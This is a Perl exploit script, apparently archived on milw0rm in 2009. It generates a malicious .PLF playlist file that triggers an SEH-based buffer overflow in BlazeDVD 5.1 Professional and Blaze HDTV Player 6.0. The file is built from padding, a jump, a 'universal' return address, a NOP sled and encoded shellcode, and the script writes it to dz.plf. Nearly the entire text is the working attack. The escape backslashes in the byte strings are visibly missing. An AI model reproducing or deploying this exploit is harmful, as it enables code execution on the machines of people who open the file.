#!/usr/bin/perl
# by ThE g0bL!N
#THNX: His0k4 Wahdo :)
#BlazeDVD 5.1 Professional/Blaze HDTV Player 6.0 /(.PLF File) Universal Buffer Overflow Exploit (SEH)
##################################################################
my $bof="x41" x 608;
my $nsh="xEBx06x90x90";
my $seh="x71xFBx32x60" ;# Universal Address
my $nop="x90" x 20;
my $sec=
"xebx03x59xebx05xe8xf8xffxffxffx4fx49x49x49x49x49".
"x49x51x5ax56x54x58x36x33x30x56x58x34x41x30x42x36".
"x48x48x30x42x33x30x42x43x56x58x32x42x44x42x48x34".
"x41x32x41x44x30x41x44x54x42x44x51x42x30x41x44x41".
"x56x58x34x5ax38x42x44x4ax4fx4dx4ex4fx4ax4ex46x34".
"x42x50x42x50x42x30x4bx38x45x34x4ex43x4bx48x4ex47".
"x45x30x4ax47x41x50x4fx4ex4bx48x4fx44x4ax41x4bx48".
"x4fx55x42x52x41x30x4bx4ex49x54x4bx58x46x43x4bx38".
"x41x50x50x4ex41x33x42x4cx49x49x4ex4ax46x48x42x4c".
"x46x37x47x50x41x4cx4cx4cx4dx30x41x30x44x4cx4bx4e".
"x46x4fx4bx43x46x55x46x32x46x30x45x47x45x4ex4bx48".
"x4fx35x46x32x41x30x4bx4ex48x56x4bx58x4ex30x4bx44".
"x4bx58x4fx55x4ex31x41x50x4bx4ex4bx58x4ex51x4bx48".
"x41x50x4bx4ex49x58x4ex55x46x42x46x30x43x4cx41x33".
"x42x4cx46x36x4bx38x42x44x42x53x45x48x42x4cx4ax37".
"x4ex30x4bx48x42x54x4ex30x4bx58x42x57x4ex51x4dx4a".
"x4bx38x4ax36x4ax50x4bx4ex49x30x4bx48x42x48x42x4b".
"x42x50x42x50x42x50x4bx48x4ax56x4ex33x4fx35x41x53".
"x48x4fx42x56x48x45x49x38x4ax4fx43x58x42x4cx4bx57".
"x42x35x4ax46x42x4fx4cx58x46x50x4fx55x4ax36x4ax59".
"x50x4fx4cx38x50x50x47x35x4fx4fx47x4ex43x36x41x56".
"x4ex56x43x46x42x30x5a";
print $bof.$nsh.$seh.$nop.$sec;
###################################################################
open(myfile,'>> dz.plf');
print myfile $bof.$nsh.$seh.$nop.$sec;
###################################################################

# milw0rm.com [2009-08-04]